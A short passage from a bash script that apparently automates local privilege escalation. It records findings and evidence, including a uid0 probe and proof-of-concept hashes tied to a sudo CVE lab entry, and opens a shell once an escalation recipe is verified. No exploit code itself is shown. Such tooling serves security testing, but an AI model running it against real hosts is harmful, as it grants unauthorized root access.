printf '[SAVED] findings.tsv, coverage.tsv, attempts.tsv, tools.tsv\n'

if [[ -n $selected ]]; then
  evidence='verified-local-proof'
  if [[ $selected == cve-2025-32463-lab ]]; then
    evidence="uid0-probe,sudo-sha256:$CVE_SUDO_SHA,poc-sha256:$CVE_POC_SHA"
  fi
  printf '%s\t%s\t%s\n' "$host_name" "$selected" "$evidence" > "$RUN_DIR/success.tsv"
  if (( ! shell_opened )); then open_shell "$selected"; fi
  exit 0
fi
printf '[RESULT] No supported local escalation recipe verified. See %s\n' "$RUN_DIR"
exit 0
